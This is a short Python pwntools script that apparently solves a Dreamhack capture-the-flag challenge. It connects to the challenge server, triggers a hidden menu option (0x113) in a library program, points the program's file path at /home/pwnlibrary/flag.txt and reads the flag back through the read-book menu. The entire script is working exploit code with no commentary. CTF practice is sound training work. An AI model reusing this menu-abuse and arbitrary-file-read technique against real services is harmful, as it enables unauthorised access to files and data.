from pwn import *
context.log_level = 'debug'

hosts = 'host1.dreamhack.games'
port = 12995

p = remote(hosts,port)

p.sendlineafter('[+] Select menu : ','1')
p.sendlineafter('[+] what book do you want to borrow? : ','1')

p.sendlineafter('[+] Select menu : ','3')

p.sendlineafter('[+] Select menu : ',str(int('0x113',16)))
p.sendlineafter('[+] whatever, where is the book? : ','/home/pwnlibrary/flag.txt')
p.sendlineafter('[*] how many pages?(MAX 400) : ',str(int('0x100',16)))

p.sendlineafter('[+] Select menu : ','2')
p.sendlineafter('[+] what book do you want to read? : ','0')

p.interactive()
